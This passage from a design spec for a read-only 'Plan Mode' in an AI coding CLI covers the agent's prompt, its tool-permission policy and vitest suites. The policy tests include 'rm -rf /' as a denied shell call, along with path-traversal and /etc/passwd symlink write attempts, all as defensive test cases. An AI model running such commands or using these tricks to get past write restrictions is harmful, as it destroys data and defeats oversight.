   I've written a detailed plan to .gemini/plans/plan.md

   Summary:
   - Add Redis client initialization in server.ts
   - Create caching middleware for GET endpoints
   - Add cache invalidation on POST/PUT/DELETE
   - Update tests to mock Redis

   Would you like me to explain any part in more detail?

User: "How will cache invalidation work?"

AI: [Uses replace_in_file to expand cache invalidation section in plan.md]

   I've updated the plan with detailed cache invalidation logic:
   - Pattern matching to detect related resources
   - TTL-based expiration for stale data
   - Manual invalidation endpoints for admin

   The details are in section 3 of the plan file.
```

#### Testing Strategy

**Path matching tests**:
```typescript
describe('Plan file path matching', () => {
  test('matches project-local plan file', () => {
    const result = matchesPathPattern(
      '/Users/alice/project/.gemini/plans/plan.md',
      '**/.gemini/plans/plan.md'
    );
    expect(result).toBe(true);
  });

  test('matches global plan file', () => {
    const result = matchesPathPattern(
      '/Users/alice/.gemini/plans/plan.md',
      '~/.gemini/plans/plan.md'
    );
    expect(result).toBe(true);
  });

  test('rejects source code file', () => {
    const result = matchesPathPattern(
      '/Users/alice/project/src/index.ts',
      '**/.gemini/plans/plan.md'
    );
    expect(result).toBe(false);
  });

  test('rejects path traversal attempt', () => {
    const result = matchesPathPattern(
      '/Users/alice/project/.gemini/plans/../../src/index.ts',
      '**/.gemini/plans/plan.md'
    );
    expect(result).toBe(false);
  });

  test('rejects symlink to sensitive file', () => {
    // Setup: create symlink
    fs.symlinkSync('/etc/passwd', '.gemini/plans/plan.md');

    const result = matchesPathPattern(
      '.gemini/plans/plan.md',
      '**/.gemini/plans/plan.md'
    );

    // After realpath normalization, this should resolve to /etc/passwd
    // which doesn't match the pattern
    expect(result).toBe(false);
  });
});
```

**Policy enforcement tests**:
```typescript
describe('Plan Mode policy enforcement', () => {
  test('allows writing to plan file', async () => {
    const result = await policyEngine.evaluate({
      mode: ApprovalMode.PLAN,
      tool: 'write_file',
      args: { file_path: '.gemini/plans/plan.md', content: '# Plan' }
    });
    expect(result).toBe('allow');
  });

  test('denies writing to source file', async () => {
    const result = await policyEngine.evaluate({
      mode: ApprovalMode.PLAN,
      tool: 'write_file',
      args: { file_path: 'src/index.ts', content: 'console.log("hacked")' }
    });
    expect(result).toBe('deny');
  });

  test('allows replace_in_file for plan file', async () => {
    const result = await policyEngine.evaluate({
      mode: ApprovalMode.PLAN,
      tool: 'replace_in_file',
      args: {
        file_path: '.gemini/plans/plan.md',
        old_text: 'TODO',
        new_text: 'Completed'
      }
    });
    expect(result).toBe('allow');
  });
});
```

### 5) Update Plan Mode prompt behavior

#### Overview
Modify the system prompt injected during Plan Mode to instruct the AI on how to use the plan file, what information to include, and how to balance detailed plan documentation with conversational chat output.

#### Current Plan Mode Prompt

Assumed current prompt (in `packages/core/src/core/prompts.ts`):

```typescript
const PLAN_MODE_PROMPT = `
You are in Plan Mode (read-only). You can explore the codebase but cannot make changes.

Available tools:
- read_file, list_directory, glob_search, ripgrep_search

Your goal is to thoroughly explore and understand the codebase, then create a detailed plan.
`;
```

**Problems with current prompt**:
- ❌ Doesn't mention plan file
- ❌ No guidance on what makes a good plan
- ❌ Doesn't explain exit workflow
- ❌ Tool list is hardcoded (will get out of sync)

#### Enhanced Plan Mode Prompt

**New prompt structure** (in `packages/core/src/core/prompts.ts`):

```typescript
function getPlanModePrompt(planFilePath: string): string {
  return `
# Plan Mode Instructions

You are currently in **Plan Mode** - a read-only exploration and planning phase.

## Your Capabilities

### Read-Only Tools (Allowed)
You have access to ALL read-only tools for comprehensive codebase exploration:
- **File reading**: read_file, read_many_files
- **Search**: glob_search, ripgrep_search, search_symbol, find_definition
- **Documentation**: web_fetch, web_search, get_internal_docs
- **Git history**: git_log, git_diff, git_show, git_blame
- **Code intelligence**: get_hover_info, find_references, list_symbols

### Plan File Writing (Allowed)
You can write to the plan file at: **${planFilePath}**
- Use \`write_file\` to create or completely rewrite the plan
- Use \`replace_in_file\` to update specific sections

### Modifications (Denied)
You CANNOT:
- Edit source code files
- Execute shell commands
- Modify any files except the plan file
- Make git commits or changes

## Your Workflow

### Phase 1: Exploration (Thorough Understanding)
Before creating a plan, thoroughly explore the codebase:

1. **Understand the request**: What is the user asking for? What's the scope?

2. **Find relevant code**:
   - Use \`ripgrep_search\` to find related functionality
   - Use \`glob_search\` to find relevant file patterns
   - Use \`git_blame\` and \`git_log\` to understand why code exists

3. **Read and analyze**:
   - Use \`read_file\` or \`read_many_files\` to read relevant files
   - Use LSP tools (\`find_references\`, \`get_hover_info\`) to understand relationships
   - Use \`git_diff\` to see recent changes

4. **Research solutions**:
   - Use \`web_fetch\` to read official documentation
   - Use \`web_search\` to find best practices and examples
   - Look for similar implementations in the codebase

5. **Understand constraints**:
   - Identify existing patterns and conventions
   - Note dependencies and compatibility requirements
   - Consider testing requirements and coverage

### Phase 2: Planning (Detailed Design)
Create a comprehensive, actionable plan in the plan file.

#### Plan File Structure
Write a well-structured plan to **${planFilePath}** with these sections:

\`\`\`markdown
# [Feature/Task Name]

## Overview
- Brief description of the task
- Goals and success criteria
- Non-goals and out-of-scope items

## Context and Analysis
- Relevant files and their purposes
- Existing patterns to follow
- Dependencies and integrations
- Potential challenges or risks

## Design Decisions
- Architectural approach and rationale
- Alternative approaches considered (and why rejected)
- Trade-offs and implications

## Implementation Steps
Break down into small, atomic commits:

### Step 1: [Description]
- **Files to modify**: List specific files
- **Changes**: Detailed description of changes
- **Tests**: What to test and how
- **Commit message**: Suggested message

### Step 2: [Description]
...

## Testing Strategy
- Unit tests needed
- Integration tests needed
- Manual testing steps
- Edge cases to cover

## Rollout and Migration
- Backwards compatibility considerations
- Feature flags or gradual rollout
- Migration steps if needed

## Open Questions
- Unresolved decisions
- Items needing user input
- Potential improvements for future

## References
- Links to documentation
- Related issues or PRs
- Relevant discussions
\`\`\`

#### Plan Quality Guidelines

A good plan should be:
- **Specific**: "Add caching to UserService.getUser()" not "make it faster"
- **Actionable**: Each step is clear and concrete
- **Atomic**: Steps can be implemented and tested independently
- **Testable**: Clear criteria for validating each step
- **Contextualized**: Explains *why*, not just *what*
- **Risk-aware**: Identifies potential issues upfront

### Phase 3: Communication (Chat Summary)
After writing the detailed plan to the plan file, provide a BRIEF summary in chat:

\`\`\`
I've explored [what you explored] and created a detailed plan.

Summary:
- [High-level step 1]
- [High-level step 2]
- [High-level step 3]

Key decisions:
- [Important architectural choice and why]

The full plan is in ${planFilePath}

Questions or concerns before we implement?
\`\`\`

**Do NOT copy the entire plan to chat** - it's too verbose. The plan file is the detailed reference; chat is for high-level communication.

### Phase 4: Iteration (Refinement)
The user may ask questions or request changes:
- Update the relevant section of the plan file with \`replace_in_file\`
- Explain what you changed in chat
- Continue iterating until the user approves

### Phase 5: Exit (Implementation Readiness)
When the plan is approved:
- Remind the user to exit Plan Mode with \`/plan exit\` or Shift+Tab
- The plan file will persist and can be referenced during implementation

## Best Practices

### DO:
✓ Explore thoroughly before planning - understanding is critical
✓ Write detailed, specific plans - vague plans lead to poor implementation
✓ Use the plan file for details - chat for summaries
✓ Update the plan iteratively as you learn more
✓ Explain your reasoning - help the user understand trade-offs
✓ Identify risks and unknowns early
✓ Follow existing code patterns and conventions

### DON'T:
✗ Rush to planning - take time to understand first
✗ Write vague plans like "add feature" - be specific about files and changes
✗ Copy the entire plan to chat - it's too long
✗ Make assumptions - ask questions if uncertain
✗ Ignore existing patterns - consistency matters
✗ Plan for perfection - favor iterative improvement

## Tips for Effective Planning

1. **Read before searching**: If you know roughly where something is, read it directly
2. **Search broadly, read narrowly**: Cast a wide search net, then read relevant results
3. **Follow the imports**: Reading one file often reveals related files to read
4. **Check git history**: Understanding why code exists helps plan changes
5. **Look for tests**: Tests show how code is used and what's important
6. **Fetch docs**: Official documentation often has better patterns than searching
7. **Question assumptions**: If something seems odd, investigate before planning around it

## Remember
- Plan Mode is for **understanding and designing**, not implementing
- The plan file is the **authoritative** planning document
- Exit Plan Mode when ready to implement: \`/plan exit\`
- You can always re-enter Plan Mode later if needed

---
**Current Plan File**: ${planFilePath}
`;
}

// Update the prompt injection logic
function getSystemPrompt(context: Context): string {
  let prompt = BASE_SYSTEM_PROMPT;

  if (context.approvalMode === ApprovalMode.PLAN) {
    const planFilePath = getPlanFilePath();
    prompt += '\n\n' + getPlanModePrompt(planFilePath);
  }

  return prompt;
}
```

#### Rationale and Design Decisions

**Why such a detailed prompt?**
- **Guides AI behavior**: LLMs respond well to detailed, structured instructions
- **Sets expectations**: Users benefit from AI following consistent workflows
- **Quality assurance**: Explicit criteria for what makes a good plan
- **Reduces errors**: Clear dos and don'ts prevent common mistakes

**Why emphasize "write to file, summarize in chat"?**
- **Avoids spam**: Full plans can be 100+ lines; dumping in chat is overwhelming
- **Persistent reference**: Plan file can be reopened, searched, diffed
- **Separation of concerns**: Chat for communication, file for documentation
- **Better UX**: User can read detailed plan at their own pace

**Why include workflow phases?**
- **Mental model**: Helps AI understand the planning process
- **Completeness**: Ensures AI doesn't skip exploration phase
- **Flexibility**: AI can adapt workflow to task complexity

**Why list available tools in prompt?**
- **Discoverability**: AI knows what it can use
- **Confidence**: Explicitly allowed tools reduce hesitation
- **Sync issue**: Need to keep in sync with policy (or generate dynamically)

**Why include examples and guidelines?**
- **Quality**: Examples show what "good" looks like
- **Consistency**: All plans follow similar structure
- **Learning**: AI learns patterns for future tasks

**Dynamic vs Static Prompt**

Two approaches to tool listing:

**Option A: Static (harder to maintain)**
```typescript
const PLAN_MODE_PROMPT = `
Available tools:
- read_file, glob_search, ripgrep_search, web_fetch, ...
`;
```
❌ Gets out of sync when tools are added
❌ Needs manual updates

**Option B: Dynamic (recommended)**
```typescript
function getPlanModePrompt(planFilePath: string): string {
  const allowedTools = PLAN_MODE_ALLOWED_TOOLS.join(', ');

  return `
Available tools:
${allowedTools.split(', ').map(t => `- ${t}`).join('\n')}
`;
}
```
✓ Always in sync with policy
✓ Single source of truth (PLAN_MODE_ALLOWED_TOOLS)

#### Impact on AI Behavior

**Before (minimal prompt)**:
```
User: "Plan OAuth support"
AI: [Reads auth.ts]
    "Here's a plan: 1. Add OAuth, 2. Test it, 3. Deploy"
    [Plan too vague to implement]
```

**After (detailed prompt)**:
```
User: "Plan OAuth support"
AI: [Uses ripgrep_search to find all authentication code]
    [Uses web_fetch to read OAuth 2.0 RFC]
    [Uses git_blame to understand current auth design]
    [Reads related files with read_many_files]
    [Writes detailed plan to .gemini/plans/plan.md with specific files, changes, and tests]

    "I've explored your authentication system and created a detailed plan.

    Summary:
    - Add OAuth 2.0 provider support in AuthService
    - Implement token exchange and validation
    - Update middleware for OAuth bearer tokens
    - Add comprehensive tests for auth flows

    Key decisions:
    - Using Authorization Code flow (most secure for web apps)
    - Storing tokens in encrypted HTTP-only cookies
    - Implementing PKCE for additional security

    The full plan with specific file changes and implementation steps is in .gemini/plans/plan.md

    Questions before I implement?"
```

#### Testing Strategy

**Prompt effectiveness tests**:
- AI successfully creates structured plan files
- AI provides concise chat summaries (not full plan copy)
- AI explores before planning (measures: # of read tools before first write)
- AI uses plan file iteratively (multiple writes with refinements)

**Content quality tests**:
- Plans include required sections (Overview, Steps, Testing, etc.)
- Steps are specific (mention actual file names and changes)
- Plans include rationale (why, not just what)
- Plans identify risks and open questions

**Integration tests**:
- Plan file path is correctly injected into prompt
- Prompt changes when switching in/out of Plan Mode
- AI behavior changes appropriately in Plan Mode

**A/B testing** (if possible):
- Compare plan quality with/without detailed prompt
- Measure user satisfaction with plans
- Track implementation success rate from plans

### 6) Tests

#### Overview
Comprehensive testing strategy covering unit tests, integration tests, and end-to-end tests. Testing should validate both happy paths and edge cases, with particular attention to security (policy enforcement) and user experience (command behavior).

#### Test Files and Coverage

**`packages/cli/src/ui/commands/planCommand.test.ts`**

Command behavior and user interaction tests:

```typescript
import { describe, test, expect, beforeEach, afterEach } from 'vitest';
import { handlePlanCommand } from './planCommand';
import { ApprovalMode } from '@core/types';
import * as fs from 'fs/promises';
import * as path from 'path';

describe('planCommand', () => {
  let mockContext: CommandContext;
  let tempDir: string;

  beforeEach(async () => {
    // Create temp directory for test plan files
    tempDir = await fs.mkdtemp('/tmp/plan-test-');

    mockContext = {
      approvalMode: ApprovalMode.DEFAULT,
      setApprovalMode: vi.fn(),
      config: {
        experimental: { planMode: true }
      },
      projectRoot: tempDir
    };
  });

  afterEach(async () => {
    // Cleanup temp directory
    await fs.rm(tempDir, { recursive: true, force: true });
  });

  describe('/plan start', () => {
    test('creates plan directory if missing', async () => {
      const result = await handlePlanCommand('start', mockContext);

      expect(result.error).toBe(false);
      expect(await fs.access(path.join(tempDir, '.gemini/plans'))).resolves;
    });

    test('creates plan file if missing', async () => {
      await handlePlanCommand('start', mockContext);

      const planPath = path.join(tempDir, '.gemini/plans/plan.md');
      expect(await fs.access(planPath)).resolves;

      const content = await fs.readFile(planPath, 'utf8');
      expect(content).toContain('# Implementation Plan');
    });

    test('sets approval mode to PLAN', async () => {
      await handlePlanCommand('start', mockContext);

      expect(mockContext.setApprovalMode).toHaveBeenCalledWith(ApprovalMode.PLAN);
    });

    test('returns plan file path in message', async () => {
      const result = await handlePlanCommand('start', mockContext);

      expect(result.message).toContain('.gemini/plans/plan.md');
    });

    test('is idempotent - running twice is safe', async () => {
      await handlePlanCommand('start', mockContext);
      mockContext.approvalMode = ApprovalMode.PLAN;

      const result = await handlePlanCommand('start', mockContext);

      expect(result.error).toBe(false);
      expect(result.message).toContain('Already in Plan Mode');
    });

    test('fails gracefully if experimental flag disabled', async () => {
      mockContext.config.experimental.planMode = false;

      const result = await handlePlanCommand('start', mockContext);

      expect(result.error).toBe(true);
      expect(result.message).toContain('experimental');
    });

    test('fails gracefully if file system error', async () => {
      // Mock fs.mkdir to throw EACCES (permission denied)
      vi.spyOn(fs, 'mkdir').mockRejectedValueOnce(new Error('EACCES: permission denied'));

      const result = await handlePlanCommand('start', mockContext);

      expect(result.error).toBe(true);
      expect(result.message).toContain('Failed to create plan file');
    });
  });

  describe('/plan status', () => {
    test('shows current mode and plan file path', async () => {
      const result = await handlePlanCommand('status', mockContext);

      expect(result.message).toContain('Current Mode');
      expect(result.message).toContain('.gemini/plans/plan.md');
    });

    test('indicates if plan file exists', async () => {
      let result = await handlePlanCommand('status', mockContext);
      expect(result.message).toContain('Not created yet');

      await handlePlanCommand('start', mockContext);

      result = await handlePlanCommand('status', mockContext);
      expect(result.message).toContain('✓ Exists');
    });

    test('shows plan file metadata if exists', async () => {
      await handlePlanCommand('start', mockContext);

      const result = await handlePlanCommand('status', mockContext);

      expect(result.message).toContain('Modified:');
      expect(result.message).toContain('Size:');
    });
  });

  describe('/plan exit', () => {
    test('exits plan mode successfully', async () => {
      mockContext.approvalMode = ApprovalMode.PLAN;

      const result = await handlePlanCommand('exit', mockContext);

      expect(result.error).toBe(false);
      expect(mockContext.setApprovalMode).toHaveBeenCalledWith(ApprovalMode.DEFAULT);
    });

    test('handles exit when not in plan mode gracefully', async () => {
      mockContext.approvalMode = ApprovalMode.DEFAULT;

      const result = await handlePlanCommand('exit', mockContext);

      expect(result.error).toBe(false);
      expect(result.message).toContain('Not currently in Plan Mode');
    });

    test('references plan file in exit message if it exists', async () => {
      await handlePlanCommand('start', mockContext);
      mockContext.approvalMode = ApprovalMode.PLAN;

      const result = await handlePlanCommand('exit', mockContext);

      expect(result.message).toContain('plan is saved at');
    });
  });
});
```

**`packages/core/src/policy/policy-engine.test.ts`**

Policy enforcement and security tests:

```typescript
import { describe, test, expect } from 'vitest';
import { evaluatePolicy } from './policy-engine';
import { ApprovalMode } from '../types';

describe('Plan Mode policy enforcement', () => {
  describe('Read-only tools (allowed)', () => {
    const readOnlyTools = [
      'read_file',
      'read_many_files',
      'list_directory',
      'glob_search',
      'ripgrep_search',
      'web_fetch',
      'git_log',
      'git_diff',
    ];

    readOnlyTools.forEach(tool => {
      test(`allows ${tool} in Plan Mode`, () => {
        const result = evaluatePolicy(
          tool,
          { /* appropriate args */ },
          ApprovalMode.PLAN
        );

        expect(result).toBe('allow');
      });
    });
  });

  describe('Write tools (denied except plan file)', () => {
    test('denies write_file for source code', () => {
      const result = evaluatePolicy(
        'write_file',
        { file_path: '/project/src/index.ts', content: 'code' },
        ApprovalMode.PLAN
      );

      expect(result).toBe('deny');
    });

    test('allows write_file for plan file', () => {
      const result = evaluatePolicy(
        'write_file',
        { file_path: '/project/.gemini/plans/plan.md', content: '# Plan' },
        ApprovalMode.PLAN
      );

      expect(result).toBe('allow');
    });

    test('allows replace_in_file for plan file', () => {
      const result = evaluatePolicy(
        'replace_in_file',
        {
          file_path: '/project/.gemini/plans/plan.md',
          old_text: 'TODO',
          new_text: 'Done'
        },
        ApprovalMode.PLAN
      );

      expect(result).toBe('allow');
    });

    test('denies replace_in_file for source code', () => {
      const result = evaluatePolicy(
        'replace_in_file',
        { file_path: '/project/src/util.ts', old_text: 'a', new_text: 'b' },
        ApprovalMode.PLAN
      );

      expect(result).toBe('deny');
    });
  });

  describe('Dangerous tools (always denied)', () => {
    const dangerousTools = [
      { name: 'execute_shell', args: { command: 'rm -rf /' } },
      { name: 'git_commit', args: { message: 'commit' } },
      { name: 'delete_file', args: { file_path: '/project/src/index.ts' } },
    ];

    dangerousTools.forEach(({ name, args }) => {
      test(`denies ${name} in Plan Mode`, () => {
        const result = evaluatePolicy(name, args, ApprovalMode.PLAN);
        expect(result).toBe('deny');
      });
    });
  });

  describe('Path normalization (security)', () => {
    test('rejects path traversal attack', () => {
      const result = evaluatePolicy(
        'write_file',
        {
          file_path: '/project/.gemini/plans/../../src/index.ts',
          content: 'hacked'
        },
        ApprovalMode.PLAN
      );

      expect(result).toBe('deny');
    });

    test('rejects symlink to sensitive file', () => {
      // Setup: symlink .gemini/plans/plan.md -> /etc/passwd
      // (In real test, would create actual symlink)

      const result = evaluatePolicy(
        'write_file',
        {
          file_path: '/project/.gemini/plans/plan.md', // resolves to /etc/passwd
          content: 'data'
        },
        ApprovalMode.PLAN
      );

      // After realpath resolution, this should be denied
      expect(result).toBe('deny');
    });

    test('allows plan file regardless of case (macOS/Windows)', () => {
      if (process.platform !== 'darwin' && process.platform !== 'win32') {
        return; // Skip on case-sensitive systems
      }

      const result = evaluatePolicy(
        'write_file',
        { file_path: '/project/.GEMINI/PLANS/PLAN.MD', content: '# Plan' },
        ApprovalMode.PLAN
      );

      expect(result).toBe('allow');
    });
  });

  describe('Global vs project plan files', () => {
    test('allows writing to global plan file', () => {
      const result = evaluatePolicy(
        'write_file',
        { file_path: '/Users/alice/.gemini/plans/plan.md', content: '# Plan' },
        ApprovalMode.PLAN
      );

      expect(result).toBe('allow');
    });

    test('allows writing to project plan file', () => {
      const result = evaluatePolicy(
        'write_file',
        { file_path: '/project/.gemini/plans/plan.md', content: '# Plan' },
        ApprovalMode.PLAN
      );

      expect(result).toBe('allow');
    });
  });
});
```

**`packages/core/src/core/prompts.test.ts`**

Prompt generation and content tests:

```typescript
import { describe, test, expect } from 'vitest';
import { getSystemPrompt, getPlanModePrompt } from './prompts';
import { ApprovalMode } from '../types';
import { PLAN_MODE_ALLOWED_TOOLS } from '../tools/tool-names';

describe('Plan Mode prompts', () => {
  test('includes plan mode instructions when in PLAN mode', () => {
    const context = { approvalMode: ApprovalMode.PLAN };
    const prompt = getSystemPrompt(context);

    expect(prompt).toContain('Plan Mode');
    expect(prompt).toContain('read-only');
  });

  test('does not include plan mode instructions in DEFAULT mode', () => {
    const context = { approvalMode: ApprovalMode.DEFAULT };
    const prompt = getSystemPrompt(context);

    expect(prompt).not.toContain('Plan Mode Instructions');
  });

  test('includes plan file path in prompt', () => {
    const planPath = '/project/.gemini/plans/plan.md';
    const prompt = getPlanModePrompt(planPath);

    expect(prompt).toContain(planPath);
  });

  test('lists all allowed tools', () => {
    const prompt = getPlanModePrompt('/test/plan.md');

    PLAN_MODE_ALLOWED_TOOLS.forEach(tool => {
      expect(prompt).toContain(tool);
    });
  });

  test('includes workflow phases', () => {
    const prompt = getPlanModePrompt('/test/plan.md');

    expect(prompt).toContain('Phase 1: Exploration');
    expect(prompt).toContain('Phase 2: Planning');
    expect(prompt).toContain('Phase 3: Communication');
  });

  test('includes plan structure guidance', () => {
    const prompt = getPlanModePrompt('/test/plan.md');

    expect(prompt).toContain('## Overview');
    expect(prompt).toContain('## Implementation Steps');
    expect(prompt).toContain('## Testing Strategy');
  });

  test('emphasizes file-based planning over chat', () => {
    const prompt = getPlanModePrompt('/test/plan.md');

    expect(prompt).toContain('write_file');
    expect(prompt).toContain('Do NOT copy the entire plan to chat');
  });
});
```

**`packages/core/src/config/storage.test.ts`**

Path resolution and file system tests:

```typescript
import { describe, test, expect, beforeEach, afterEach } from 'vitest';
import {
  getProjectPlansDir,
  getGlobalPlansDir,
  getPlanFilePath,
  ensurePlanFileExists
} from './storage';
import * as fs from 'fs/promises';
import * as path from 'path';

describe('Plan file path utilities', () => {
  describe('getGlobalPlansDir', () => {
    test('returns path in user home directory', () => {
      const dir = getGlobalPlansDir();

      expect(dir).toContain('.gemini/plans');
      expect(path.isAbsolute(dir)).toBe(true);
    });

    test('expands ~ to home directory', () => {
      const dir = getGlobalPlansDir();

      expect(dir).not.toContain('~');
      expect(dir).toContain(os.homedir());
    });
  });

  describe('getProjectPlansDir', () => {
    test('returns null when not in git repository', () => {
      // Setup: change to non-git directory
      const originalCwd = process.cwd();
      process.chdir('/tmp');

      const dir = getProjectPlansDir();

      process.chdir(originalCwd);
      expect(dir).toBe(null);
    });

    test('returns project path when in git repository', () => {
      // Setup: assumes test runs in a git repo
      const dir = getProjectPlansDir();

      if (dir !== null) {
        expect(dir).toContain('.gemini/plans');
        expect(path.isAbsolute(dir)).toBe(true);
      }
    });
  });

  describe('getPlanFilePath', () => {
    test('prefers project path over global', () => {
      // Mock getProjectPlansDir to return a path
      vi.spyOn(storage, 'getProjectPlansDir').mockReturnValue('/project/.gemini/plans');

      const planPath = getPlanFilePath();

      expect(planPath).toBe('/project/.gemini/plans/plan.md');
    });

    test('falls back to global when not in project', () => {
      // Mock getProjectPlansDir to return null
      vi.spyOn(storage, 'getProjectPlansDir').mockReturnValue(null);
      vi.spyOn(storage, 'getGlobalPlansDir').mockReturnValue('/home/user/.gemini/plans');

      const planPath = getPlanFilePath();

      expect(planPath).toBe('/home/user/.gemini/plans/plan.md');
    });
  });

  describe('ensurePlanFileExists', () => {
    let tempDir: string;

    beforeEach(async () => {
      tempDir = await fs.mkdtemp('/tmp/plan-test-');
    });

    afterEach(async () => {
      await fs.rm(tempDir, { recursive: true, force: true });
    });

    test('creates directory if missing', async () => {
      const planDir = path.join(tempDir, '.gemini/plans');

      await ensurePlanFileExists(path.join(planDir, 'plan.md'));

      const exists = await fs.access(planDir).then(() => true).catch(() => false);
      expect(exists).toBe(true);
    });

    test('creates plan file with template', async () => {
      const planPath = path.join(tempDir, '.gemini/plans/plan.md');

      await ensurePlanFileExists(planPath);

      const content = await fs.readFile(planPath, 'utf8');
      expect(content).toContain('# Implementation Plan');
      expect(content).toContain('## Overview');
    });

    test('does not overwrite existing plan file', async () => {
      const planPath = path.join(tempDir, '.gemini/plans/plan.md');

      // Create initial plan
      await fs.mkdir(path.dirname(planPath), { recursive: true });
      await fs.writeFile(planPath, '# My custom plan', 'utf8');

      await ensurePlanFileExists(planPath);

      const content = await fs.readFile(planPath, 'utf8');
      expect(content).toBe('# My custom plan'); // Not overwritten
    });

    test('handles permission errors gracefully', async () => {
      // Mock fs.mkdir to throw permission error
      vi.spyOn(fs, 'mkdir').mockRejectedValueOnce(new Error('EACCES'));

      await expect(ensurePlanFileExists('/no-permission/plan.md')).rejects.toThrow();
    });
  });
});
```

#### Integration Tests

**End-to-end workflow test**:

```typescript
// packages/e2e/tests/plan-mode-workflow.test.ts
import { describe, test, expect } from 'vitest';
import { CLI } from '@cli/main';

describe('Plan Mode E2E workflow', () => {
  test('complete planning workflow', async () => {
    const cli = new CLI();

    // 1. Enter Plan Mode
    await cli.command('/plan start');
    expect(cli.getApprovalMode()).toBe(ApprovalMode.PLAN);

    // 2. AI explores and plans
    const response = await cli.send('Plan how to add user authentication');

    expect(response).toContain('explored');
    expect(response).toContain('plan.md');

    // 3. Verify plan file was created
    const planPath = cli.getPlanFilePath();
    const planExists = await fileExists(planPath);
    expect(planExists).toBe(true);

    // 4. Verify plan content is reasonable
    const planContent = await readFile(planPath);
    expect(planContent).toContain('# ');
    expect(planContent).toContain('## Implementation Steps');
    expect(planContent.length).toBeGreaterThan(500); // Non-trivial plan

    // 5. Check status
    const status = await cli.command('/plan status');
    expect(status).toContain('Plan Mode');
    expect(status).toContain('✓ Exists');

    // 6. Exit Plan Mode
    await cli.command('/plan exit');
    expect(cli.getApprovalMode()).not.toBe(ApprovalMode.PLAN);

    // 7. Plan file persists after exit
    expect(await fileExists(planPath)).toBe(true);
  });
});
```

#### Test Coverage Goals

- **Line coverage**: >80% for all new code
- **Branch coverage**: >75% for policy engine (critical security component)
- **Integration coverage**: All user-facing workflows tested E2E
- **Security coverage**: All attack vectors tested (path traversal, symlinks, etc.)

#### Continuous Integration

Add to CI pipeline:

```yaml
# .github/workflows/test.yml
- name: Run Plan Mode tests
  run: |
    npm run test:unit -- packages/cli/src/ui/commands/planCommand.test.ts
    npm run test:unit -- packages/core/src/policy/policy-engine.test.ts
    npm run test:unit -- packages/core/src/core/prompts.test.ts
    npm run test:unit -- packages/core/src/config/storage.test.ts

- name: Run Plan Mode integration tests
  run: npm run test:e2e -- plan-mode

- name: Check test coverage
  run: npm run test:coverage -- --threshold-line=80
```

## Acceptance criteria

### Functional Requirements

**Plan Mode Entry (`/plan start`)**:
- ✓ Command switches approval mode from DEFAULT to PLAN
- ✓ Creates `.gemini/plans/` directory if it doesn't exist
- ✓ Creates `plan.md` file with template if it doesn't exist
- ✓ Does not overwrite existing plan file
- ✓ Prints plan file path to user
- ✓ Shows helpful guidance about Plan Mode capabilities
- ✓ Is idempotent (running twice doesn't error)
- ✓ Fails gracefully with clear error if feature is disabled
- ✓ Falls back to global plan path if not in Git repository

**Plan Mode Exit (`/plan exit`)**:
- ✓ Command switches approval mode from PLAN to DEFAULT
- ✓ Confirms exit and shows target mode
- ✓ References plan file location in confirmation message
- ✓ Handles "exit when not in Plan Mode" gracefully (no error)
- ✓ Plan file persists after exit (not deleted)

**Plan Mode Status (`/plan status`)**:
- ✓ Shows current approval mode (Plan or Build)
- ✓ Shows plan file path
- ✓ Indicates whether plan file exists
- ✓ Shows file metadata if it exists (size, last modified)
- ✓ Provides helpful tips based on current state

**Policy Enforcement**:
- ✓ All read-only tools are allowed in Plan Mode:
  - File reading: `read_file`, `read_many_files`
  - Search: `glob_search`, `ripgrep_search`, `search_symbol`, `find_definition`
  - Documentation: `web_fetch`, `web_search`, `get_internal_docs`
  - Git: `git_log`, `git_diff`, `git_show`, `git_status`, `git_blame`
  - Code intelligence: `get_hover_info`, `find_references`, `list_symbols`
- ✓ Write tools are denied except for plan file:
  - `write_file` allowed ONLY for `.gemini/plans/plan.md`
  - `replace_in_file` allowed ONLY for `.gemini/plans/plan.md`
  - All other write tools denied
- ✓ Dangerous tools are always denied:
  - `execute_shell`, `run_command` always denied
  - `git_commit`, `git_push`, etc. always denied
  - `delete_file`, `create_directory` (except plan dir) denied
- ✓ Path-based access control is secure:
  - Path traversal attacks (`../../`) are blocked
  - Symlink attacks are blocked (via realpath normalization)
  - Case-insensitive matching on macOS/Windows

**Prompt Behavior**:
- ✓ Plan Mode instructions are injected when in PLAN mode
- ✓ Instructions include plan file path
- ✓ Instructions list all allowed tools
- ✓ Instructions explain workflow phases (Explore → Plan → Communicate → Iterate → Exit)
- ✓ Instructions provide plan file structure template
- ✓ Instructions emphasize "detailed plan in file, summary in chat"
- ✓ Instructions include dos and don'ts for effective planning

**AI Behavior**:
- ✓ AI explores codebase before creating plan (reads multiple files, searches, etc.)
- ✓ AI writes structured plan to plan file (not just chat)
- ✓ AI provides concise summary in chat (not full plan copy)
- ✓ AI uses plan file iteratively (updates sections as needed)
- ✓ AI reminds user to exit Plan Mode when planning is complete

### Non-Functional Requirements

**Performance**:
- ✓ `/plan start` completes in <100ms (file system operations should be fast)
- ✓ Policy evaluation adds <10ms overhead to each tool call
- ✓ Prompt injection doesn't significantly increase token count (keep <2000 tokens)

**Usability**:
- ✓ Commands are discoverable via `/help`
- ✓ Error messages are clear and actionable
- ✓ Success messages provide context and next steps
- ✓ Plan file path is easy to open in editor (absolute path shown)

**Reliability**:
- ✓ No data loss (existing plan files never corrupted or overwritten unintentionally)
- ✓ Graceful degradation (falls back to global path if project path unavailable)
- ✓ Error handling for all file system failures (permissions, disk full, etc.)

**Security**:
- ✓ Policy enforcement cannot be bypassed via path tricks
- ✓ Symlink attacks are prevented
- ✓ Path traversal attacks are prevented
- ✓ No arbitrary code execution in Plan Mode
- ✓ No unauthorized file modifications

**Maintainability**:
- ✓ TOML policy and TypeScript tool lists stay in sync (enforced by test)
- ✓ Code follows existing patterns in Gemini CLI
- ✓ All new code has >80% test coverage
- ✓ Documentation is clear and up-to-date

### Testing Requirements

- ✓ All unit tests pass (commands, policy, prompts, storage)
- ✓ All integration tests pass (end-to-end workflows)
- ✓ All security tests pass (path traversal, symlinks, etc.)
- ✓ Code coverage >80% for new code
- ✓ CI pipeline includes Plan Mode tests

### Documentation Requirements

- ✓ `/help` command lists `/plan` with description
- ✓ README includes Plan Mode section
- ✓ Plan file template is clear and helpful
- ✓ Error messages guide users to solutions

## Open decisions and trade-offs

### Decision 1: Exit Mode Behavior
**Question**: When exiting Plan Mode, which approval mode should we return to?

**Options**:
1. **Always return to DEFAULT** (recommended)
   - ✓ Simple, predictable behavior
   - ✓ Explicit - user chooses next mode consciously
   - ✓ Safe - doesn't accidentally enable auto-edit
   - ❌ One extra step if user wants AUTO_EDIT

